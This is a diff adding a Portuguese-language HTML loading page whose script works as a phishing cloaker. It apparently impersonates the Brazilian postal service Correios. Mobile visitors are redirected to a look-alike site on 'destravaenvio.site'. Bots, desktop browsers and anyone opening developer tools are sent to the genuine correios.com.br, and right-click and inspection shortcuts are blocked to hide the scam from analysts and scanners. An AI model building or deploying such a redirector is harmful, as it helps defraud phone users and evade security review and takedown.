@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carregando...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: white;
+            font-family: Arial, sans-serif;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+
+    <script>
+        // ========== CONFIGURAÇÕES - ALTERE AQUI ==========
+        const ORIGINAL_SITE = 'https://destravaenvio.site/correios/'; // SEU SITE VERDADEIRO
+        const DECOY_SITE = 'https://correios.com.br'; // SITE ALTERNATIVO
+        // ================================================
+
+        // Detectar DevTools
+        function detectDevTools() {
+            const threshold = 160;
+            const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+            const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+            return widthThreshold || heightThreshold;
+        }
+
+        // Detectar Mobile
+        function isMobile() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const mobileKeywords = ['android', 'webos', 'iphone', 'ipad', 'ipod', 'blackberry', 'windows phone', 'mobile'];
+            const isMobileUA = mobileKeywords.some(keyword => userAgent.includes(keyword));
+            const isMobileScreen = window.innerWidth <= 768;
+            return isMobileUA || isMobileScreen;
+        }
+
+        // Detectar Bots
+        function isBot() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const botKeywords = [
+                'bot', 'crawler', 'spider', 'scraper', 'headless', 'phantom', 
+                'selenium', 'puppeteer', 'playwright', 'googlebot', 'bingbot', 
+                'facebookexternalhit', 'twitterbot', 'linkedinbot', 'slackbot'
+            ];
+            return botKeywords.some(keyword => userAgent.includes(keyword));
+        }
+
+        // Função de Redirecionamento
+        function redirect() {
+            const mobile = isMobile();
+            const devToolsOpen = detectDevTools();
+            const bot = isBot();
+
+            console.log('Debug:', { mobile, devToolsOpen, bot });
+
+            // Se for BOT ou DESKTOP ou DEVTOOLS = vai para DECOY
+            if (bot || !mobile || devToolsOpen) {
+                window.location.replace(DECOY_SITE);
+                return;
+            }
+
+            // Se for MOBILE legítimo = vai para SITE ORIGINAL
+            window.location.replace(ORIGINAL_SITE);
+        }
+
+        // Prevenir teclas de inspeção
+        function preventKeys(e) {
+            if (e.keyCode === 123 || 
+                (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
+                (e.ctrlKey && e.shiftKey && e.keyCode === 74) ||
+                (e.ctrlKey && e.keyCode === 85)) {
+                e.preventDefault();
+                window.location.replace(DECOY_SITE);
+            }
+        }
+
+        // Prevenir clique direito
+        function preventRightClick(e) {
+            e.preventDefault();
+            window.location.replace(DECOY_SITE);
+        }
+
+        // Monitorar redimensionamento
+        function handleResize() {
+            if (detectDevTools()) {
+                window.location.replace(DECOY_SITE);
+            }
+        }
+
+        // Adicionar listeners
+        document.addEventListener('keydown', preventKeys);
+        document.addEventListener('contextmenu', preventRightClick);
+        window.addEventListener('resize', handleResize);
+
+        // Redirecionamento inicial
+        setTimeout(redirect, 200);
+
+        // Monitoramento contínuo
+        setInterval(() => {
+            if (detectDevTools()) {
+                window.location.replace(DECOY_SITE);
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
